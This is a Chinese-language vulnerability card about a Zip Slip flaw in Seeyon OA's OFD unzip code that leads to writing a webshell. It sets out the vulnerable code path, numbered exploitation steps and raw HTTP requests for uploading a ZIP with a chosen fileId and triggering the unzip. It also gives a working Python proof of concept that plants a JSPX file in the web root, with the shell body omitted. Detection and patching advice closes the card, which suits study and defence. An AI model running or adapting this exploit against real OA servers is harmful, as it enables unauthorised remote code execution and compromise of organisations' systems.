---
id: web-java-component-seeyon-ofd-unzip-zipslip-webshell-write
title: 致远OA OFD 解压 Zip Slip：saveFile 控制 fileId 上传恶意包、content.do invokingForm 触发解压写 Web 根 JSPX 致 RCE
type: scenario
domain: web
path: web/java/component
technique: seeyon-ofd-unzip-zip-slip-webshell-write
aliases:
- 致远OA ofd解压漏洞
- OfdJavaZipUtil unzip Zip Slip
- 致远 A8+ OFD 解压任意文件写入
- content.do invokingForm ofdFileId
- rest/editContent/saveFile 任意 fileId
tags:
- java
- seeyon
- oa
- ofd
- zip-slip
- file-upload
- arbitrary-write
- webshell
- rce
cve: []
affected_versions: 致远 A8+ 集团版 V8.0SP2（原文环境；官方 2023-06“ofd解压漏洞安全补丁”230600-S007 适配 V5/G6 V8.0SP2 及以上全系列版本）
severity: critical
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V540
  verified_at: '2026-11-11T19:12:22+08:00'
  notes: 已对照 content.md 与 img01-19 核对：图01 官方补丁页 230600-S007/2023年6月/适配 V5/G6 V8.0SP2 及以上全系列，与卡内 affected_versions 一致；图02-03/09 补丁 diff 与旧版 path+zn.getName() 写入点；图04-08 getOfdMetadata→EdocApiImpl→MainbodyController 调用链及 content.do bean 路由；图11-16 saveFile 的 fileId 客户端可控与 fileManager.save(v3xfile)；图08/10 010 Editor 与 WinRAR 修改 ZIP 条目名；图17-18 upload.py 执行成功（密码 sky）；图19 ROOT 下 mzr.jspx 落地。未验证点：未在本机复跑 PoC，安装路径与目录可写仅原文测试环境。dedup 结论 new，候选为契约锁 OFD/通用 Zip Slip 等不同产品或不同 sink。
---

## 一句话结论

致远 OA 的 `OfdJavaZipUtil.unzip` 在解压 OFD（ZIP 容器）时把条目名直接拼进 `FileOutputStream(path + zn.getName())` 而不校验路径，条目名带 `../` 即可把任意文件写出解压目录；配合 `/seeyon/rest/editContent/saveFile` 可由攻击者自选 `fileId` 上传 ZIP，再用 `/seeyon/content/content.do?method=invokingForm&subApp=2&ofdFileId=<fileId>&isNew=true` 触发解压，把 JSPX 写入 `ApacheJetspeed/webapps/ROOT/` 获得 RCE。

## 原理

- OFD 文件本质是 ZIP 容器。补丁对比显示 `com.seeyon.apps.govdoc.gb.util.OfdJavaZipUtil#unzip` 在旧版中没有路径校验：遍历条目后直接 `File f = new File(path + zn.getName())`，再 `fos = new FileOutputStream(path + zn.getName())` 写入。
- 新补丁在写入前增加了规范化校验：
  ```java
  File f = new File(path, zn.getName());
  File f1 = new File(Strings.getCanonicalPath(f.getPath()));
  if (!FileUtil.inDirectory(f1, new File(path))) {
      LOGGER.error("发现文件解压漏洞攻击行为： " + AppContext.currentUserName() + " 文件路径：" + f1.getAbsolutePath());
      return;
  }
  ```
  即先把最终路径 canonical 化，再要求它必须位于传入的 `path` 目录内；旧版缺这一步，`..` 段在拼接后的文件系统解析时生效，写点落在解压目录之外。
- 解压目录为 `SystemEnvironment.getSystemTempFolder()/ofd/<fileId>/`（`GovdocGBManagerImpl#getOfdMetadata(Long, File, boolean, Map)`），路径末尾自带分隔符，条目名 `../../../../ApacheJetspeed/webapps/ROOT/mzr.jspx` 即可向上穿越到安装目录下的 Web 根。
- 触发链（Spring bean `name="/content/content.do"` 指向 `MainbodyController`，按 `method` 参数分发到 `invokingForm`）：
  1. `MainbodyController#invokingForm` 读取请求参数 `ofdFileId`、`subApp`、`isNew`；当 `isNew` 非空且不为 `"false"`、`"2".equals(subApp)` 时调用 `edocApi.getOfdMetaDataFromOfdFile(Long.parseLong(ofdFileId))`。
  2. `EdocApiImpl#getOfdMetaDataFromOfdFile` 调用 `govdocGBManager.getOfdMetadata(ofdFileId)`。
  3. `GovdocGBManagerImpl#getOfdMetadata(Long fileId)` 用 `this.fileManager.getFile(fileId)` 取出文件，再调 `this.getOfdMetadata(fileId, file, true, null)`。
  4. 最终 `OfdJavaZipUtil.unzip(sourceFilePath, unzipFilePath, charsetMap)` 解压该文件。
- 文件内容与 ID 的来源：`/seeyon/rest/editContent/saveFile` 从请求参数取 `fileId`（`Long.valueOf(request.getParameter("fileId"))`），把上传文件保存到文件库并以该 `fileId` 保存 `V3XFile`（`fileManager.save(v3xfile)`）。`fileId` 由客户端指定而非服务端生成，攻击者因此既能把 ZIP 内容存进文件库，又知道触发解压时要传的 `ofdFileId`。
- 解压成功后流程会读取 `OFD.xml`，`onlyRead=true` 时还会删除解压目录，但被穿越写入 Web 根的文件在解压目录之外，不会被删除，随后直接请求即可执行。

## 触发条件

- 目标为未打“ofd解压漏洞安全补丁”（补丁编号 230600-S007，2023 年 6 月发布）的致远 OA；原文环境为 A8+ 集团版 V8.0SP2，补丁页适配 V5/G6 V8.0SP2 及以上全系列版本。
- 攻击者持有有效登录会话（`saveFile` 与 `content.do` 的 PoC 均携带 JSESSIONID，未提及前台未授权）。
- 目标安装路径可预测（Windows 默认 `C:\Seeyon\A8\`，Web 根为 `ApacheJetspeed/webapps/ROOT/`），且 Web 进程对目标目录有写权限。
- 请求满足 `isNew` 非空/非 `false`、`subApp=2`。

## 利用步骤

1. 构造恶意 OFD/ZIP：条目内容为 JSPX webshell，条目名设为穿越路径，例如 `../../../../ApacheJetspeed/webapps/ROOT/mzr.jspx`（层数按解压目录 `/tmp/ofd/<fileId>/` 的实际深度调整）。
2. 若用桌面压缩工具打包（Windows 文件系统不允许文件名含 `/`），需用 010 Editor 等十六进制编辑器同时修改 ZIP 本地文件头与中央目录两处的条目名；用 Python `zipfile` 直接 `writestr` 任意条目名则无需改包。
3. 调用上传接口保存 ZIP，`fileId` 任选自一个 Long：
   ```http
   POST /seeyon/rest/editContent/saveFile?fileId=9095842667142857911&category=1 HTTP/1.1
   Host: target
   Cookie: JSESSIONID=<有效会话>
   Content-Type: multipart/form-data; boundary=X

   --X
   Content-Disposition: form-data; name="file"; filename="a.zip"
   Content-Type: application/zip

   <zip bytes>
   --X--
   ```
4. 触发解压：
   ```http
   GET /seeyon/content/content.do?method=invokingForm&subApp=2&ofdFileId=9095842667142857911&isNew=true HTTP/1.1
   Host: target
   Cookie: JSESSIONID=<有效会话>
   ```
5. 请求写入的 webshell 路径验证执行（原文为 `GET /mzr.jspx`），确认返回 200 并执行命令。

## PoC

```python
import io, zipfile, requests

host = "http://target"
s = requests.Session()
s.headers["Cookie"] = "JSESSIONID=<有效会话>"

buf = io.BytesIO()
with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
    # 条目名由攻击者完全控制，可直接写入 ../；无需 010 Editor
    z.writestr("../../../../ApacheJetspeed/webapps/ROOT/mzr.jspx",
               "<!-- 原文内置一个密码为 sky 的 JSPX 小马，此处省略载荷 -->")
payload = buf.getvalue()

file_id = "9095842667142857911"  # 任意 Long，上传后作为 ofdFileId
s.post(f"{host}/seeyon/rest/editContent/saveFile?fileId={file_id}&category=1",
       files={"file": ("a.zip", payload, "application/zip")})
s.get(f"{host}/seeyon/content/content.do?method=invokingForm"
      f"&subApp=2&ofdFileId={file_id}&isNew=true")
print(s.get(f"{host}/mzr.jspx").status_code)  # 200 即写入成功
```

说明：原文用 base64 内嵌预构造 ZIP 并经 `010 Editor` 修改两处条目名（本地头与中央目录），在测试环境成功将 `mzr.jspx` 写入 `C:\Seeyon\A8\ApacheJetspeed\webapps\ROOT\` 并返回“上传成功”。PoC 未在本机复跑。

## 变体与关联

- 变体：写点不限于 `webapps/ROOT`，可按安装路径覆盖任意可写文件（如配置文件、计划任务、其他 Web 应用目录）；Linux 部署下把条目名改为对应路径并按 `/tmp/ofd/<fileId>/` 计算 `../` 层数。
- 变体：`GovdocGBManagerImpl#resetOfdMetadata`（同文件 1133 行）同样调用 `getOfdMetadata(..., false, charsetMap)`，若可达也触发同一解压 sink；任何基于 `fileId` 取文件的入口都可作为触发面。
- 关联：[[web-generic-file-upload-zip-slip-webshell-write]]（通用 Zip Slip 写 Web 根思路）；[[web-java-component-qiyuesuo-ofd-zipslip-hotpatch-jar-rce]]（同为 OFD/ZIP 解压穿越，但目标是覆盖热补丁 JAR 触发静态块）；[[web-java-component-seeyon-autoinstall-login-locale-zip-traversal]]（同为致远 OA 的 ZIP 路径处理缺陷，但那是下载穿越读文件）。
- 边界：补丁在解压前做 canonical 路径包含校验后失效；目标目录不可写、安装路径不可预测，或上传接口/触发接口鉴权收紧时，链路不成立。

## 检测与防御

- 检测：OFD/ZIP 上传中出现 `../`、绝对路径或反斜杠条目名；`/seeyon/content/content.do?method=invokingForm` 请求带 `subApp=2` 与异常 `ofdFileId`；`/seeyon/rest/editContent/saveFile` 出现客户端自选 `fileId` 的调用；Web 根目录新增 `.jsp`/`.jspx` 文件。
- 防御：安装官方“ofd解压漏洞安全补丁”（230600-S007）或升级到已修复版本；解压前对每个条目 canonical 化并校验必须位于解压目录内，拒绝绝对路径与 `..`。
- 防御：`fileId` 改由服务端生成、客户端只持有不可预测句柄；上传接口与 OFD 元数据接口增加细粒度鉴权；Web 根目录对应用进程设为不可写，解压使用隔离低权限临时目录。
